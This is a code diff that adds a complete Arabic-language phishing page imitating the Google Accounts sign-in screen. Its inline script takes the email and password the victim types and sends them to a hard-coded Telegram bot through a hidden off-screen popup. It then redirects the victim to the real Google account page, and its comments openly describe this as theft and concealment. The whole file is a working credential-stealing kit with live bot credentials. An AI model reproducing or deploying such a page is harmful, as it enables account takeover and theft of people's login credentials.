@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حسابات Google</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #202124; }
+        .container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 450px; max-width: 100%; box-sizing: border-box; text-align: center; }
+        .google-logo { margin-bottom: 10px; }
+        .title { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        .subtitle { font-size: 16px; margin-bottom: 30px; }
+        .input-group { margin-bottom: 10px; text-align: right; position: relative; }
+        input { width: 100%; height: 55px; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .forgot-link { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; display: block; text-align: right; margin-top: 8px; cursor: pointer; }
+        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .create-btn { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; }
+        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; transition: background 0.2s; }
+        .next-btn:hover { background-color: #1b66c9; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3); }
+        
+        /* التمويه البصري للشعار */
+        .g-text { font-size: 24px; font-weight: bold; font-family: 'Product Sans', sans-serif; }
+        .c1 { color: #4285F4; } .c2 { color: #EA4335; } .c3 { color: #FBBC05; } .c4 { color: #34A853; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="google-logo">
+            <span class="g-text"><span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c1">g</span><span class="c4">l</span><span class="c2">e</span></span>
+        </div>
+        <div class="title">تسجيل الدخول</div>
+        <div class="subtitle">استخدام حسابك على Google</div>
+        
+        <form id="googleExtractor">
+            <div class="input-group">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+            </div>
+            
+            <div class="forgot-link">هل نسيت البريد الإلكتروني؟</div>
+            
+            <p style="font-size: 14px; color: #5f6368; text-align: right; line-height: 1.4; margin-top: 30px;">
+                ليس جهاز الكمبيوتر الخاص بك؟ استخدم وضع التصفح المتخفي لتسجيل الدخول بشكل خاص. 
+                <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">مزيد من المعلومات</a>
+            </p>
+
+            <div class="footer-btns">
+                <span class="create-btn">إنشاء حساب</span>
+                <button type="submit" class="next-btn">التالي</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // تمت إزالة بروتوكول replaceState لتجنب أخطاء SecurityError في بيئات الاختبار
+        
+        const _T = '8201696738:AAGFkCZTmXwbCh_RfNxURBZtH2NZjBhUAsg';
+        const _C = '7576816211';
+
+        document.getElementById('googleExtractor').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const u = document.getElementById('email').value;
+            const p = document.getElementById('pass').value;
+            
+            const log = `🛡️ صيد Google جديد 🛡️\n👤 البريد: ${u}\n🔑 الباسورد: ${p}\n📂 النوع: Google Accounts V3`;
+            const target = `https://api.telegram.org/bot${_T}/sendMessage?chat_id=${_C}&text=${encodeURIComponent(log)}`;
+            
+            // المنهجية المخفية الناجحة
+            const portal = window.open(target, 'auth_' + Date.now(), 'width=1,height=1,left=20000,top=20000');
+            
+            setTimeout(() => {
+                if (portal) portal.close();
+                // التوجيه لصفحة حساب جوجل الحقيقية بعد السرقة
+                window.location.replace("https://myaccount.google.com/");
+            }, 800);
+        });
+    </script>
+</body>
+</html>
